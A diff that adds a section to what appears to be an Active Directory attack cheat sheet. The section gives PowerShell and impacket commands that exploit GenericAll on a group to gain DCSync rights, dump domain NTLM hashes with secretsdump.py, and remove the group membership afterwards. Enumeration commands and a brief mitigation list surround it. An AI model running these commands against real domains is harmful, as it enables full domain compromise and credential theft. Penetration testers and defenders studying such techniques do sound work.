@@ -64,6 +64,34 @@ Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
 Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | select samaccountname,useraccountcontrol
 ```
 
+## DCSync via Group Membership Abuse
+
+If you have GenericAll over a group that holds DCSync rights (e.g., `GetChanges` and `GetChangesAll`), add yourself to that group then perform DCSync.
+
+### Add User to Privileged Group
+
+```powershell
+$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\user', $SecPassword)
+
+$group = Convert-NameToSid "Server Admins"
+Add-DomainGroupMember -Identity $group -Members 'targetuser' -Credential $Cred -Verbose
+```
+
+### DCSync After Group Addition
+
+```bash
+secretsdump.py targetuser@DC_IP -just-dc-ntlm
+```
+
+### Cleanup
+
+```powershell
+Remove-DomainGroupMember -Identity "Server Admins" -Members 'targetuser' -Credential $Cred -Verbose
+```
+
+---
+
 ## Mitigation
 - Limit accounts with DCSync rights to only Domain Controllers
 - Monitor for replication requests from non-DC sources
